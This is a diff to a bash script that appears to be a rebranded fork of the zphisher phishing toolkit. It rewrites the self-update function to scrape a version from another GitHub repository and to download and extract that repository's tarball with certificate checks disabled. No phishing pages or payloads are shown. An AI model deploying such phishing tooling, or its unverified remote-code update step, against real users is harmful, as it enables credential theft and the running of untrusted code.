@@ -1,6 +1,6 @@
 #!/bin/bash
 
-__version__=1.1.0
+__version__=1.0.0
 
 ## DEFAULT HOST & PORT
 HOST='127.0.0.1'
@@ -76,25 +76,24 @@ check_update(){
 	clear
 	banner_small ;
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	relase_url='https://api.github.com/repos/htr-tech/zphisher/releases/latest'
-	new_version=$(curl -s "${relase_url}" | grep '"tag_name":' | awk -F\" '{print $4}')
-	tarball_url="https://github.com/htr-tech/zphisher/archive/refs/tags/${new_version}.tar.gz"
+	new_version=$(curl --silent https://github.com/000sallam000/catch-kart/edit/main/catch-kart.sh | grep '__version__=' | cut -d">" -f2 | cut -d"<" -f1 | cut -d"=" -f 2)
+	tarball_url="https://github.com/000sallam000/catch-kart/archive/refs/tags/${new_version}.tar.gz"
 
 	if [[ $new_version != $__version__ ]]; then
-		echo -ne "${ORANGE}update found\n"${WHITE}
+		echo -ne "${ORANGE}update found ${RED}Version : ${__version__}\n"${WHITE}
 		sleep 2
-		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update..."
+		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update ${RED}Version : ${__version__} ..."
 		pushd "$HOME" > /dev/null 2>&1
 		curl --silent --insecure --fail --retry-connrefused \
-		--retry 3 --retry-delay 2 --location --output ".zphisher.tar.gz" "${tarball_url}"
+		--retry 3 --retry-delay 2 --location --output ".catch-kart.tar.gz" "${tarball_url}"
 
-		if [[ -e ".zphisher.tar.gz" ]]; then
-			tar -xf .zphisher.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
+		if [[ -e ".catch-kart.tar.gz" ]]; then
+			tar -xf .catch-kart.tar.gz -C "$BASE_DIR" --strip-components 1 > /dev/null 2>&1
 			[ $? -ne 0 ] && { echo -e "\n\n${RED}[${WHITE}!${RED}]${RED} Error occured while extracting."; reset_color; exit 1; }
-			rm -f .zphisher.tar.gz
+			rm -f .catch-kart.tar.gz
 			popd > /dev/null 2>&1
 			{ sleep 3; clear; banner_small; }
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run zphisher again\n\n"${WHITE}
+			echo -ne "\n${GREEN}[${WHITE}+${GREEN}] Successfully updated! Run catch-kart again\n\n"${WHITE}
 			{ reset_color ; exit 1; }
 		else
 			echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading."
